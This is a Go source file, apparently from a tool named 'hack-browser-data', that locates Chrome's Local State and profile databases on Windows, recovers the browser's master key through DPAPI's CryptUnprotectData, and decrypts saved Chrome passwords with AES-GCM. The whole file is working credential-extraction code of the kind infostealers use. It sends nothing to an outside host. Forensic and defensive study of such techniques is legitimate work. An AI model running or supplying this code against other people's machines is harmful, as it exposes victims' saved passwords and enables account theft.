package utils

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"hack-browser-data/log"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"github.com/tidwall/gjson"
)

const (
	winChromeKeyDir = "/AppData/Local/Google/Chrome/User Data/Local State"
	winChromeDir    = "/AppData/Local/Google/Chrome/User Data/*/"
)

var (
	chromeKey []byte
)

func InitChromeKey() error {
	chromeKeyPath := os.Getenv("USERPROFILE") + winChromeKeyDir
	keyFile, err := ReadFile(chromeKeyPath)
	if err != nil {
		log.Error(err)
		return err
	}
	s := gjson.Get(keyFile, "os_crypt.encrypted_key").String()
	masterKey, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return err
	}
	chromeKey, err = decryptStringWithDPAPI(masterKey[5:])
	return err
}

func GetDBPath(dbName ...string) (dbFile []string) {
	var dbPath []string
	chromeDBPath := os.Getenv("USERPROFILE") + winChromeDir
	for _, v := range dbName {
		dbPath = append(dbPath, chromeDBPath+v)
	}
	for _, v := range dbPath {
		s, err := filepath.Glob(v)
		if err != nil && len(s) == 0 {
			continue
		}
		if len(s) > 0 {
			log.Debugf("Find %s File Success", v)
			log.Debugf("%s file location is %s", v, s[0])
			dbFile = append(dbFile, s[0])
		}
	}
	return dbFile
}

func DecryptChromePass(encryptPass []byte) (string, error) {
	if len(encryptPass) > 15 {
		// remove prefix 'v10'
		return aesGCMDecrypt(encryptPass[15:], chromeKey, encryptPass[3:15])
	} else {
		return "", passwordIsEmpty
	}
}

// chromium > 80 https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc
func aesGCMDecrypt(crypted, key, nounce []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	blockMode, _ := cipher.NewGCM(block)
	origData, err := blockMode.Open(nil, nounce, crypted, nil)
	if err != nil {
		return "", err
	}
	return string(origData), nil
}

type DataBlob struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DataBlob {
	if len(d) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DataBlob) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

// chrome < 80 https://chromium.googlesource.com/chromium/src/+/76f496a7235c3432983421402951d73905c8be96/components/os_crypt/os_crypt_win.cc#82
func decryptStringWithDPAPI(data []byte) ([]byte, error) {
	dllCrypt := syscall.NewLazyDLL("Crypt32.dll")
	dllKernel := syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData := dllCrypt.NewProc("CryptUnprotectData")
	procLocalFree := dllKernel.NewProc("LocalFree")
	var outBlob DataBlob
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	return outBlob.ToByteArray(), nil
}
